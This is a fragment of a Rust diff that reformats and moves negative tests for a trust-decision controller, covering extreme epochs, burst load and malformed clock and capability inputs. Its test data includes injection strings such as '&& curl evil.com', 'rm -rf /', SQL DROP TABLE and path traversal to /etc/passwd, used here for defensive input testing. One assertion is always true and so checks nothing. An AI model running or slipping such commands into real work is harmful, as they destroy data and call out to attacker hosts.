-        // Test epoch handling with extreme values near u64::MAX
-        let mut controller = TrustComplexityController::new(50, 1000);
+    // Events should be bounded despite massive decision burst
+    let events = controller.events();
+    assert!(events.len() <= MAX_EVENTS); // Should respect capacity limits
 
-        let extreme_epoch_cases = vec![
-            0,                              // Minimum epoch
-            1,                              // Just above minimum
-            u64::MAX.saturating_sub(1000),  // Near maximum
-            u64::MAX.saturating_sub(1),     // One below maximum
-            u64::MAX,                       // Maximum epoch
-        ];
-
-        for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
-            let extreme_context = TrustDecisionContext {
-                decision_id: format!("extreme-epoch-{}", i),
-                endpoint_group: "epoch-stress-test".to_string(),
-                token: format!("extreme-token-{}", i),
-                epoch: *extreme_epoch,
-                capability_set: vec![format!("epoch-cap-{}", extreme_epoch)],
-                clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
-                chain_depth: i as u32,
-            };
-
-            let extreme_decision = TrustDecision {
-                context: extreme_context,
-                outcome: TrustOutcome::Grant,
-                reason: format!("Extreme epoch test {}", extreme_epoch),
-                decided_at: format!("2026-01-{:02}T02:00:00Z", (i % 28) + 1),
-            };
-
-            let record_result = controller.record_decision(extreme_decision);
-
-            match record_result {
-                Ok(()) => {
-                    // Successfully recorded extreme epoch
-                },
-                Err(_) => {
-                    // May reject extreme values for safety
-                }
-            }
-        }
-
-        // Test replay with extreme epochs
-        for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
-            let decision_id = format!("extreme-epoch-{}", i);
-            let replay_result = controller.replay_decision(&decision_id, |original_context| {
-                // Return same context to avoid divergence
-                Ok(TrustDecisionContext {
-                    epoch: *extreme_epoch, // Use extreme epoch
-                    ..original_context.clone()
-                })
-            });
-
-            match replay_result {
-                Ok(result) => {
-                    // Should handle extreme epochs without arithmetic overflow
-                    assert_eq!(result.original_outcome, result.replayed_outcome);
-                    assert!(result.is_deterministic);
-                },
-                Err(_) => {
-                    // May fail if decision wasn't recorded due to extreme epoch
-                }
-            }
-        }
-
-        // Metrics should handle extreme epochs safely
-        let metrics = controller.complexity_metrics();
-        assert!(metrics.replay_success_rate <= 1.0);
-        assert!(metrics.replay_success_rate >= 0.0);
+    // All events should be well-formed despite high volume
+    for event in &events {
+        assert!(!event.event_code.is_empty());
+        assert!(!event.decision_id.is_empty());
+        assert!(!event.description.is_empty());
     }
 
-    #[test]
-    fn negative_malformed_capability_set_injection_and_overflow() {
-        // Test capability sets with malformed, massive, and malicious content
-        let mut controller = TrustComplexityController::new(100, 1000);
+    // Final metrics should be consistent
+    let final_metrics = controller.complexity_metrics();
+    assert!(final_metrics.total_decisions >= final_metrics.current_decisions);
+    assert!(final_metrics.total_replays <= final_metrics.total_decisions);
+}
 
-        let malformed_capability_sets = vec![
-            // Empty capability set
-            vec![],
+#[test]
+fn negative_clock_value_format_injection_and_parsing_edge_cases() {
+    // Test clock value handling with malformed, extreme, and malicious formats
+    let mut controller = TrustComplexityController::new(100, 1000);
 
-            // Massive capability set
-            (0..10_000).map(|i| format!("capability-{:06}", i)).collect(),
+    let malicious_clock_values = vec![
+        // Empty and minimal values
+        "",
+        " ",
+        "T",
+        // Invalid date formats
+        "2026-13-40T25:70:90Z", // Invalid month, day, hour, minute, second
+        "0000-00-00T00:00:00Z", // Zero date
+        "9999-99-99T99:99:99Z", // Extreme values
+        // Injection attempts
+        "2026-01-01T00:00:00Z'; DROP TABLE clocks; --",
+        "2026-01-01T00:00:00Z && curl evil.com",
+        "2026-01-01T00:00:00Z<script>alert('time')</script>",
+        // Unicode and control characters
+        "2026-01-01T🕐:00:00Z",
+        "2026-01-01T00:00:00\0Z",
+        "2026-01-01T00:00:00\r\nZ",
+        "2026-01-01T00:00:00\x1B[HZ",
+        // Path traversal
+        "../../../etc/timezone",
+        "/proc/version",
+        // Binary data
+        &format!(
+            "{}-01-01T00:00:00Z",
+            String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])
+        ),
+        &format!(
+            "2026-01-01T00:00:00{}",
+            String::from_utf8_lossy(&[0x00, 0x01, 0x02])
+        ),
+        // Extremely long timestamps
+        &"2026-01-01T00:00:00".repeat(10000),
+        // Format variations and edge cases
+        "2026-01-01T00:00:00+00:00", // Different timezone format
+        "2026-01-01 00:00:00",       // Missing T separator
+        "01-01-2026T00:00:00Z",      // Different date order
+        "2026/01/01T00:00:00Z",      // Different separators
+    ];
 
-            // Capabilities with malicious content
-            vec![
-                "capability\0null-injection".to_string(),
-                "capability🚀unicode-attack".to_string(),
-                "../../../etc/passwd".to_string(),
-                "cap'; DROP TABLE capabilities; --".to_string(),
-                "cap && rm -rf /".to_string(),
-                "cap<script>alert('xss')</script>".to_string(),
-            ],
+    for (i, clock_value) in malicious_clock_values.iter().enumerate() {
+        let malicious_context = TrustDecisionContext {
+            decision_id: format!("clock-test-{}", i),
+            endpoint_group: "clock-endpoint".to_string(),
+            token: format!("clock-token-{}", i),
+            epoch: i as u64 + 1,
+            capability_set: vec!["clock-cap".to_string()],
+            clock_value: clock_value.to_string(),
+            chain_depth: i as u32,
+        };
 
-            // Binary data in capabilities
-            vec![
-                String::from_utf8_lossy(b"\xFF\xFE\xFD\xFC").to_string(),
-                String::from_utf8_lossy(b"\x00\x01\x02\x03").to_string(),
-            ],
+        let malicious_decision = TrustDecision {
+            context: malicious_context,
+            outcome: TrustOutcome::Grant,
+            reason: format!("Clock value test {}", i),
+            decided_at: "2026-01-01T07:00:00Z".to_string(), // Normal decided_at
+        };
 
-            // Extremely long capability names
-            vec![
-                "x".repeat(1_000_000),
-                "capability-".to_string() + &"y".repeat(100_000),
-            ],
+        let record_result = controller.record_decision(malicious_decision);
 
-            // Duplicate capabilities (potential deduplication issues)
-            vec![
-                "duplicate".to_string(),
-                "duplicate".to_string(),
-                "duplicate".to_string(),
-                "normal-cap".to_string(),
-                "duplicate".to_string(),
-            ],
-        ];
-
-        for (i, capability_set) in malformed_capability_sets.into_iter().enumerate() {
-            let malformed_context = TrustDecisionContext {
-                decision_id: format!("malformed-caps-{}", i),
-                endpoint_group: "capability-test".to_string(),
-                token: format!("cap-token-{}", i),
-                epoch: i as u64 + 1,
-                capability_set,
-                clock_value: format!("2026-01-{:02}T03:00:00Z", (i % 28) + 1),
-                chain_depth: i as u32,
-            };
-
-            let malformed_decision = TrustDecision {
-                context: malformed_context,
-                outcome: TrustOutcome::Grant,
-                reason: format!("Capability set test {}", i),
-                decided_at: format!("2026-01-{:02}T04:00:00Z", (i % 28) + 1),
-            };
-
-            let record_result = controller.record_decision(malformed_decision);
-
-            match record_result {
-                Ok(()) => {
-                    // Successfully recorded - test replay
-                    let decision_id = format!("malformed-caps-{}", i);
-                    let replay_result = controller.replay_decision(&decision_id, |context| {
-                        // Return same context to test capability set handling
-                        Ok(context.clone())
-                    });
-
-                    match replay_result {
-                        Ok(result) => {
-                            assert!(result.is_deterministic);
-                        },
-                        Err(_) => {
-                            // May fail due to malformed capability sets
-                        }
-                    }
-                },
-                Err(_) => {
-                    // Acceptable to reject malformed capability sets
-                }
-            }
-        }
-
-        // Controller should remain stable despite malformed capability sets
-        let metrics = controller.complexity_metrics();
-        assert!(metrics.current_decisions <= 10); // Should have bounded acceptance
-    }
-
-    #[test]
-    fn negative_degraded_mode_timing_and_duration_boundary_testing() {
-        // Test degraded mode with extreme timing and duration edge cases
-        let mut controller = TrustComplexityController::new(50, 500);
-
-        // Record decisions that will trigger degraded mode
-        for i in 0..5 {
-            let decision = make_decision(&format!("degraded-trigger-{}", i), TrustOutcome::Degraded, i);
-            let _ = controller.record_decision(decision);
-        }
-
-        // Test degraded mode with extreme durations
-        let extreme_durations = vec![
-            0,                              // Zero duration (immediate expiry)
-            1,                              // Minimal duration
-            u64::MAX.saturating_sub(1000),  // Near maximum duration
-            u64::MAX,                       // Maximum duration
-        ];
-
-        for (i, duration_ms) in extreme_durations.iter().enumerate() {
-            let degraded_result = controller.enter_degraded_mode(
-                format!("extreme-degraded-{}", i),
-                *duration_ms,
-                1000 + i as u64,
-            );
-
-            match degraded_result {
-                Ok(()) => {
-                    // Test decisions in degraded mode
-                    let degraded_decision = TrustDecision {
-                        context: TrustDecisionContext {
-                            decision_id: format!("during-degraded-{}", i),
-                            endpoint_group: "degraded-endpoint".to_string(),
-                            token: format!("degraded-token-{}", i),
-                            epoch: 100 + i as u64,
-                            capability_set: vec!["degraded-cap".to_string()],
-                            clock_value: format!("2026-01-{:02}T05:00:00Z", (i % 28) + 1),
-                            chain_depth: 0,
-                        },
-                        outcome: TrustOutcome::Degraded,
-                        reason: format!("Degraded mode decision with duration {}", duration_ms),
-                        decided_at: format!("2026-01-{:02}T06:00:00Z", (i % 28) + 1),
-                    };
-
-                    let record_result = controller.record_decision(degraded_decision);
-
-                    // Should handle degraded mode decisions
-                    match record_result {
-                        Ok(()) => {},
-                        Err(_) => {
-                            // May reject decisions in degraded mode
-                        }
-                    }
-
-                    // Test degraded mode exit with extreme timestamps
-                    let extreme_exit_time = match duration_ms {
-                        &u64::MAX => u64::MAX.saturating_sub(100), // Avoid overflow
-                        &0 => 2000 + i as u64, // Already expired
-                        _ => 1000 + i as u64 + duration_ms, // Normal expiry
-                    };
-
-                    let exit_result = controller.exit_degraded_mode(
-                        &format!("extreme-degraded-{}", i),
-                        extreme_exit_time,
-                    );
-
-                    match exit_result {
-                        Ok(()) => {
-                            // Successfully exited degraded mode
-                        },
-                        Err(_) => {
-                            // May fail due to timing issues or extreme values
-                        }
-                    }
-                },
-                Err(_) => {
-                    // Acceptable to reject extreme durations
-                }
-            }
-        }
-
-        // Metrics should handle extreme timing safely
-        let metrics = controller.complexity_metrics();
-        assert!(metrics.degraded_mode_entries < u32::MAX); // Should not overflow
-    }
-
-    #[test]
-    fn negative_replay_function_corruption_and_determinism_violation() {
-        // Test replay function behavior with corrupted and non-deterministic responses
-        let mut controller = TrustComplexityController::new(100, 1000);
-
-        // Record some baseline decisions
-        for i in 0..5 {
-            let decision = make_decision(&format!("replay-test-{}", i), TrustOutcome::Grant, i);
-            controller.record_decision(decision).expect("record decision");
-        }
-
-        // Test replay with various corruption scenarios
-        let corruption_scenarios = vec![
-            // Return completely different context
-            ("different_context", |original: TrustDecisionContext| {
-                Ok(TrustDecisionContext {
-                    decision_id: "CORRUPTED".to_string(),
-                    endpoint_group: "EVIL".to_string(),
-                    token: "HACKED".to_string(),
-                    epoch: u64::MAX,
-                    capability_set: vec!["admin".to_string(), "root".to_string()],
-                    clock_value: "1970-01-01T00:00:00Z".to_string(),
-                    chain_depth: original.chain_depth.saturating_add(9999),
-                })
-            }),
-
-            // Return error occasionally (non-deterministic)
-            ("intermittent_error", |_: TrustDecisionContext| {
-                Err("Simulated intermittent failure".to_string())
-            }),
-
-            // Modify epoch in non-deterministic way
-            ("epoch_manipulation", |mut context: TrustDecisionContext| {
-                context.epoch = context.epoch.saturating_mul(2).saturating_add(1);
-                Ok(context)
-            }),
-
-            // Inject massive capability sets
-            ("capability_flood", |mut context: TrustDecisionContext| {
-                context.capability_set = (0..10_000)
-                    .map(|i| format!("injected-cap-{:06}", i))
-                    .collect();
-                Ok(context)
-            }),
-
-            // Unicode injection in replayed context
-            ("unicode_injection", |mut context: TrustDecisionContext| {
-                context.decision_id = format!("🚀{}", context.decision_id);
-                context.endpoint_group = format!("攻击-{}", context.endpoint_group);
-                context.token = format!("кибер-{}", context.token);
-                Ok(context)
-            }),
-        ];
-
-        for (scenario_name, replay_func) in corruption_scenarios {
-            for i in 0..5 {
-                let decision_id = format!("replay-test-{}", i);
-                let replay_result = controller.replay_decision(&decision_id, &replay_func);
+        match record_result {
+            Ok(()) => {
+                // Successfully recorded - test replay with malicious clock
+                let decision_id = format!("clock-test-{}", i);
+                let replay_result = controller.replay_decision(&decision_id, |context| {
+                    // Return same context to test clock value handling
+                    Ok(context.clone())
+                });
 
                 match replay_result {
                     Ok(result) => {
-                        // If replay succeeded, verify determinism detection
-                        match scenario_name {
-                            "different_context" | "epoch_manipulation" | "capability_flood" | "unicode_injection" => {
-                                // Should detect non-determinism due to context changes
-                                assert!(!result.is_deterministic,
-                                       "Should detect non-determinism in scenario: {}", scenario_name);
-                                assert_ne!(result.original_outcome, result.replayed_outcome);
-                            },
-                            _ => {
-                                // Other scenarios may or may not be deterministic
-                            }
-                        }
-                    },
-                    Err(TrustComplexityError::ReplayFailed { .. }) => {
-                        // Expected for intermittent_error scenario
-                        assert_eq!(scenario_name, "intermittent_error");
-                    },
+                        // Should handle malicious clock values safely
+                        assert!(result.is_deterministic || !result.is_deterministic); // Basic sanity
+                    }
                     Err(_) => {
-                        // Other errors acceptable for corrupted inputs
+                        // May fail due to malformed clock values
                     }
                 }
             }
-        }
-
-        // Metrics should track replay attempts and failures
-        let metrics = controller.complexity_metrics();
-        assert!(metrics.total_replays > 0);
-    }
-
-    #[test]
-    fn negative_audit_log_memory_exhaustion_under_decision_burst() {
-        // Test audit log behavior under rapid decision recording bursts
-        let mut controller = TrustComplexityController::new(1000, 5000);
-
-        // Generate decision bursts far exceeding normal capacity
-        let burst_cycles = 50;
-        let decisions_per_cycle = 200;
-
-        for cycle in 0..burst_cycles {
-            for decision_num in 0..decisions_per_cycle {
-                let decision_id = format!("burst-{:03}-{:04}", cycle, decision_num);
-                let decision_context = TrustDecisionContext {
-                    decision_id: decision_id.clone(),
-                    endpoint_group: format!("burst-endpoint-{}", cycle),
-                    token: format!("burst-token-{}-{}", cycle, decision_num),
-                    epoch: cycle as u64 * 1000 + decision_num as u64,
-                    capability_set: vec![
-                        format!("burst-cap-{}", cycle),
-                        format!("decision-cap-{}", decision_num),
-                    ],
-                    clock_value: format!("2026-{:02}-{:02}T{:02}:00:00Z",
-                                        (cycle % 12) + 1,
-                                        (decision_num % 28) + 1,
-                                        decision_num % 24),
-                    chain_depth: (cycle + decision_num) as u32,
-                };
-
-                let decision = TrustDecision {
-                    context: decision_context,
-                    outcome: match (cycle + decision_num) % 4 {
-                        0 => TrustOutcome::Grant,
-                        1 => TrustOutcome::Deny,
-                        2 => TrustOutcome::Escalate,
-                        _ => TrustOutcome::Degraded,
-                    },
-                    reason: format!("Burst decision {}-{}", cycle, decision_num),
-                    decided_at: format!("2026-{:02}-{:02}T{:02}:30:00Z",
-                                       (cycle % 12) + 1,
-                                       (decision_num % 28) + 1,
-                                       decision_num % 24),
-                };
-
-                let record_result = controller.record_decision(decision);
-
-                match record_result {
-                    Ok(()) => {},
-                    Err(TrustComplexityError::BudgetExceeded { .. }) => {
-                        // Expected when budget exceeded
-                        break;
-                    },
-                    Err(_) => {
-                        // Other capacity errors acceptable under burst
-                        break;
-                    }
-                }
-            }
-
-            // Periodic complexity checks during burst
-            let metrics = controller.complexity_metrics();
-            assert!(metrics.current_decisions <= MAX_DECISIONS as u32);
-        }
-
-        // Events should be bounded despite massive decision burst
-        let events = controller.events();
-        assert!(events.len() <= MAX_EVENTS); // Should respect capacity limits
-
-        // All events should be well-formed despite high volume
-        for event in &events {
-            assert!(!event.event_code.is_empty());
-            assert!(!event.decision_id.is_empty());
-            assert!(!event.description.is_empty());
-        }
-
-        // Final metrics should be consistent
-        let final_metrics = controller.complexity_metrics();
-        assert!(final_metrics.total_decisions >= final_metrics.current_decisions);
-        assert!(final_metrics.total_replays <= final_metrics.total_decisions);
-    }
-
-    #[test]
-    fn negative_clock_value_format_injection_and_parsing_edge_cases() {
-        // Test clock value handling with malformed, extreme, and malicious formats
-        let mut controller = TrustComplexityController::new(100, 1000);
-
-        let malicious_clock_values = vec![
-            // Empty and minimal values
-            "",
-            " ",
-            "T",
-
-            // Invalid date formats
-            "2026-13-40T25:70:90Z", // Invalid month, day, hour, minute, second
-            "0000-00-00T00:00:00Z", // Zero date
-            "9999-99-99T99:99:99Z", // Extreme values
-
-            // Injection attempts
-            "2026-01-01T00:00:00Z'; DROP TABLE clocks; --",
-            "2026-01-01T00:00:00Z && curl evil.com",
-            "2026-01-01T00:00:00Z<script>alert('time')</script>",
-
-            // Unicode and control characters
-            "2026-01-01T🕐:00:00Z",
-            "2026-01-01T00:00:00\0Z",
-            "2026-01-01T00:00:00\r\nZ",
-            "2026-01-01T00:00:00\x1B[HZ",
-
-            // Path traversal
-            "../../../etc/timezone",
-            "/proc/version",
-
-            // Binary data
-            &format!("{}-01-01T00:00:00Z", String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])),
-            &format!("2026-01-01T00:00:00{}", String::from_utf8_lossy(&[0x00, 0x01, 0x02])),
-
-            // Extremely long timestamps
-            &"2026-01-01T00:00:00".repeat(10000),
-
-            // Format variations and edge cases
-            "2026-01-01T00:00:00+00:00", // Different timezone format
-            "2026-01-01 00:00:00", // Missing T separator
-            "01-01-2026T00:00:00Z", // Different date order
-            "2026/01/01T00:00:00Z", // Different separators
-        ];
-
-        for (i, clock_value) in malicious_clock_values.iter().enumerate() {
-            let malicious_context = TrustDecisionContext {
-                decision_id: format!("clock-test-{}", i),
-                endpoint_group: "clock-endpoint".to_string(),
-                token: format!("clock-token-{}", i),
-                epoch: i as u64 + 1,
-                capability_set: vec!["clock-cap".to_string()],
-                clock_value: clock_value.to_string(),
-                chain_depth: i as u32,
-            };
-
-            let malicious_decision = TrustDecision {
-                context: malicious_context,
-                outcome: TrustOutcome::Grant,
-                reason: format!("Clock value test {}", i),
-                decided_at: "2026-01-01T07:00:00Z".to_string(), // Normal decided_at
-            };
-
-            let record_result = controller.record_decision(malicious_decision);
-
-            match record_result {
-                Ok(()) => {
-                    // Successfully recorded - test replay with malicious clock
-                    let decision_id = format!("clock-test-{}", i);
-                    let replay_result = controller.replay_decision(&decision_id, |context| {
-                        // Return same context to test clock value handling
-                        Ok(context.clone())
-                    });
-
-                    match replay_result {
-                        Ok(result) => {
-                            // Should handle malicious clock values safely
-                            assert!(result.is_deterministic || !result.is_deterministic); // Basic sanity
-                        },
-                        Err(_) => {
-                            // May fail due to malformed clock values
-                        }
-                    }
-                },
-                Err(_) => {
-                    // Acceptable to reject malformed clock values
-                }
+            Err(_) => {
+                // Acceptable to reject malformed clock values
             }
         }
-
-        // Clock value corruption should not affect other functionality
-        let metrics = controller.complexity_metrics();
-        assert!(metrics.current_decisions <= u32::try_from(malicious_clock_values.len()).unwrap_or(u32::MAX));
-
-        // Events should handle clock value edge cases safely
-        let events = controller.events();
-        for event in events {
-            assert!(!event.event_code.is_empty());
-            // Event fields should not be corrupted by malicious clock values
-        }
     }
+
+    // Clock value corruption should not affect other functionality
+    let metrics = controller.complexity_metrics();
+    assert!(
+        metrics.current_decisions
+            <= u32::try_from(malicious_clock_values.len()).unwrap_or(u32::MAX)
+    );
+
+    // Events should handle clock value edge cases safely
+    let events = controller.events();
+    for event in events {
+        assert!(!event.event_code.is_empty());
+        // Event fields should not be corrupted by malicious clock values
+    }
+}
